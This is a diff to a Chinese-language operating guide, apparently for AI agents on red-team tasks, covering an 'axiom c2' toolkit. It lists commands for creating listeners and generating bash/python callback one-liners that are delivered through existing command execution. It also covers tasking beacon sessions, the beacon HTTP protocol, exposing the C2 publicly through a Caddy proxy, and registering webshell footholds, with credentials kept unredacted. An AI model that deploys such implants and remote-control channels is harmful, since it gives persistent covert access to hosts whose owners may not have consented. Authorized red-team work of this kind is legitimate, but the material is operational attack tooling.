@@ -27,21 +27,21 @@ description: 当红队任务里拿到或需要复用稳定立足点时使用：W
 | `axiom c2 listeners` | 本任务监听器（id/name/kind/host:port/status） |
 | `axiom c2 listener-create --name N --port P [--host 127.0.0.1]` | 建监听器（不自动启动）；只有 http 档，host 强制回环 |
 | `axiom c2 listener-start <cl_id>` / `listener-stop <cl_id>` | 启停 |
-| `axiom c2 oneliner <cl_id>` | 回连 one-liner（bash/python 轮询版）；把回连地址换成 `https://<公网IP>:8888/c2` 后，通过已有命令执行能力投递 |
+| `axiom c2 oneliner <cl_id>` | 回连 one-liner（bash/python 轮询版），地址取自 `AXIOM_C2_PUBLIC_BASE`，直接投递即可；若 note 里带「警告：未配置」，说明服务端没配对外地址，不要投递，先报给运维 |
 | `axiom c2 sessions [--listener-id clX]` | 上线会话（id/remote/info/status/last_seen/sleep） |
 | `axiom c2 session-sleep <cs_id> --seconds N` | 调轮询间隔：交互需求高才调小，默认 5s 已够；长潜伏调大降低噪声 |
 | `axiom c2 session-kill <cs_id>` | 标记会话死亡 |
 | `axiom c2 exec <cs_id> '<命令>' [--wait 30]` | 下发任务：http 会话入队等 beacon 取走并回传 |
 | `axiom c2 tasks [--session-id csX]` / `axiom c2 task <ct_id>` | 任务队列与结果（status: queued/sent/completed/failed） |
 
-http 监听协议：beacon `GET /index?sid=<自定id>` 取下一条命令（空=无任务），`POST /index?sid=<id>` 回传 base64 结果；新 sid 自动建会话。服务重启后监听器**不会**自动拉起，状态回落 stopped，需要重新 start。
+http 监听协议：beacon `GET /index?sid=<自定id>` 取下一条命令（空=无任务），`POST /index?sid=<id>` 回传 base64 结果；新 sid 自动建会话。服务重启后处于 `listening` 的监听器会**自动重新绑定**（优雅停机时状态已回落 stopped 的不会）；状态显示 `error` 的需人工看 error 字段再 start。
 
 **监听器一律绑 `127.0.0.1:8443`，经 Caddy 反代对外**（`https://<公网IP>:8888/c2/index?sid=…&token=…`）。这样不用改安全组、复用现有 TLS 证书，也不会在公网上多开一个裸端口：
 
 ```bash
 axiom c2 listener-create --name c2-8443 --port 8443 --kind http --host 127.0.0.1
 axiom c2 listener-start clXXX
-axiom c2 oneliner clXXX        # 把其中的回连地址换成 https://<公网IP>:8888/c2
+axiom c2 oneliner clXXX        # 地址已带对外 /c2/ 前缀，直接投递
 ```
 
 - `--host` 只接受回环地址，传 `0.0.0.0` 会被直接拒绝（422）。端口不要选 443 这类低端口：需要 root，且会和 Caddy 抢。
@@ -52,7 +52,7 @@ axiom c2 oneliner clXXX        # 把其中的回连地址换成 https://<公网I
 
 - Explore 拿到命令执行能力后**当场登记**（webshell create / listener-start+oneliner 投递），并把连接或会话 id 写进 findings.md 与 leads.md（如「立足点：ws003 / cs002」），后续 Intent 的前置栏直接引用。
 - 开工先 `webshell list` / `c2 sessions` 查现成立足点；status=dead 的先 `webshell test` 或看 last_seen 再决定复活还是重打。
-- 上报成果时把立足点 id 写进 `--target-asset` 或描述，Reviewer 可按 logs/tasks 复核执行轨迹。
+- 上报成果时 `--target-asset` 写被控主机的**具体 IP 或域名[:端口]**（如 `10.192.192.205（buildhost）`），立足点 id（ws003 / cs002）写进描述，Reviewer 可按 logs/tasks 复核执行轨迹。
 - 任务收尾：`listener-stop` 全部监听器、`session-kill` 残留会话；webshell 连接由人工在「红队资源」页归档或删除。
 - 凭证与输出完整留档（不脱敏），但不要把会话凭证粘进 Intent 描述这类会进导出的字段。
 
